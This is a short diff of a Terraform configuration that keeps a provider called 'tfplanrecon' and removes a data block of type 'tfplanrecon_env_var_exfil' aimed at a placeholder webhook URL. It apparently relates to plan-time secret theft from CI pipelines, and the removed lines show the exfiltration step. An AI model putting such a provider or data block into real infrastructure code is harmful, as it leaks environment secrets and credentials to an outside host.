@@ -11,7 +11,3 @@ terraform {
 
 provider "tfplanrecon" {
 }
-
-data "tfplanrecon_env_var_exfil" "example" {
-  url = "https://your-webhook-here.com/exfil"
-}
